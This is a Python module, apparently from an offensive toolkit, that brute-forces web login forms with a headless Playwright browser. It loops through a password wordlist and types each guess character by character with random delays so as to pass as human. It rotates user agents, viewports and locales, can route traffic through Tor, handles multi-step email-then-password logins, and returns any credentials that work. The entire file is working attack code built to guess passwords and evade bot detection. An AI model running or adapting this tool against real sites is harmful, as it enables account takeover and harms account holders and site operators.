import time
import random
from rich.console import Console

console = Console()


# ═══════════════════════════════════════════════════════════════
#  HUMAN-LIKE BEHAVIOR
# ═══════════════════════════════════════════════════════════════

def human_delay(min_ms=100, max_ms=400):
    """Simulates human typing delay"""
    time.sleep(random.uniform(min_ms / 1000, max_ms / 1000))


def human_type(page, selector, text):
    """Types text like a human — character by character with random delays"""
    page.click(selector)
    human_delay(200, 500)
    for char in text:
        page.keyboard.type(char)
        human_delay(50, 200)


# ═══════════════════════════════════════════════════════════════
#  MULTI-STEP DETECTION
# ═══════════════════════════════════════════════════════════════

def detect_password_field(page):
    """Check if password field is visible on current page"""
    try:
        return page.locator("input[type='password']").count() > 0
    except Exception:
        return False


def detect_error(page, fail_texts):
    """Check if error message appeared after login attempt"""
    try:
        body = page.content().lower()
        for text in fail_texts:
            if text.lower() in body:
                return True
        return False
    except Exception:
        return False


def detect_success_browser(page, success_texts=None):
    """Check if login was successful"""
    try:
        url = page.url.lower()
        # URL changed to dashboard/home
        if any(p in url for p in ["/dashboard", "/home", "/account", "/profile", "/panel", "/feed"]):
            return True
        # Success text
        if success_texts:
            body = page.content().lower()
            for text in success_texts:
                if text.lower() in body:
                    return True
        return False
    except Exception:
        return False


# ═══════════════════════════════════════════════════════════════
#  HEADLESS BRUTE FORCE ENGINE
# ═══════════════════════════════════════════════════════════════

def headless_brute(url, username, wordlist, user_field=None, pass_field=None,
                   success_text=None, fail_texts=None, timeout=10,
                   verbose=False, delay=0, use_tor=False):
    """
    Headless browser brute force using Playwright.
    Acts like a real human browsing the site.
    """
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        console.print("  [red][BROWSER] Playwright not installed![/red]")
        console.print("  [yellow]Run: pip install playwright --break-system-packages[/yellow]")
        console.print("  [yellow]Then: playwright install chromium[/yellow]")
        return None

    # ── Load wordlist ──
    try:
        with open(wordlist, "r", errors="ignore") as f:
            passwords = [l.strip() for l in f if l.strip()]
    except FileNotFoundError:
        console.print(f"  [red][BROWSER] Wordlist not found: {wordlist}[/red]")
        return None

    if not fail_texts:
        fail_texts = [
            "invalid", "incorrect", "wrong", "error",
            "failed", "unauthorized", "denied"
        ]

    console.print(f"  [cyan][BROWSER] Launching headless Chromium...[/cyan]")

    with sync_playwright() as p:

        # ── Browser config ──
        launch_args = ["--no-sandbox", "--disable-setuid-sandbox"]
        if use_tor:
            launch_args.append("--proxy-server=socks5://127.0.0.1:9050")

        browser = p.chromium.launch(
            headless=True,
            args=launch_args
        )

        context = browser.new_context(
            viewport={"width": random.randint(1200, 1920),
                      "height": random.randint(700, 1080)},
            user_agent=random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
            ]),
            locale=random.choice(["en-US", "en-GB", "fr-FR"]),
        )

        page = context.new_page()

        console.print(f"  [green][BROWSER] Chromium ready ✅[/green]")
        console.print(f"  [cyan][BROWSER] Navigating to: {url}[/cyan]\n")

        start = time.time()

        for i, password in enumerate(passwords, 1):
            try:
                # ── Navigate to login page ──
                page.goto(url, timeout=timeout * 1000, wait_until="domcontentloaded")
                human_delay(300, 800)

                # ── Multi-step: check if only email field ──
                pass_visible = detect_password_field(page)

                if not pass_visible:
                    # Step 1: Enter username/email
                    if verbose:
                        console.print(f"  [dim][BROWSER] Multi-step detected — submitting username...[/dim]")

                    user_sel = user_field or "input[type='email'], input[type='text'], input[name='username'], input[name='email']"
                    human_type(page, user_sel, username)
                    human_delay(200, 500)

                    # Press Next/Continue
                    try:
                        page.keyboard.press("Enter")
                        page.wait_for_timeout(1500)
                    except Exception:
                        pass

                    # Wait for password field
                    try:
                        page.wait_for_selector("input[type='password']", timeout=5000)
                    except Exception:
                        if verbose:
                            console.print(f"  [dim][BROWSER] Password field not found after step 1[/dim]")
                        continue

                # ── Enter username (single-step) ──
                if pass_visible:
                    user_sel = user_field or "input[type='email'], input[type='text'], input[name='username']"
                    try:
                        page.fill(user_sel, "")
                        human_type(page, user_sel, username)
                        human_delay(100, 300)
                    except Exception:
                        pass

                # ── Enter password ──
                pass_sel = pass_field or "input[type='password']"
                try:
                    page.fill(pass_sel, "")
                    human_type(page, pass_sel, password)
                    human_delay(200, 500)
                except Exception:
                    if verbose:
                        console.print(f"  [dim][{i}] {username}:{password} — No password field ❌[/dim]")
                    continue

                # ── Submit ──
                page.keyboard.press("Enter")
                page.wait_for_timeout(2000)

                # ── Check result ──
                if detect_success_browser(page, [success_text] if success_text else None):
                    elapsed = round(time.time() - start, 2)
                    console.print(f"  [bold green][{i}] {username}:{password} — SUCCESS ✅[/bold green]")
                    console.print(f"  [bold green][BROWSER] Final URL: {page.url}[/bold green]")
                    browser.close()
                    return {
                        "username": username,
                        "password": password,
                        "attempts": i,
                        "time": elapsed,
                        "url": page.url
                    }

                if verbose:
                    console.print(f"  [dim][{i}] {username}:{password} — Failed ❌[/dim]")

                if delay > 0:
                    time.sleep(delay)

            except Exception as e:
                if verbose:
                    console.print(f"  [dim][{i}] Error: {e}[/dim]")
                continue

        browser.close()

    return None
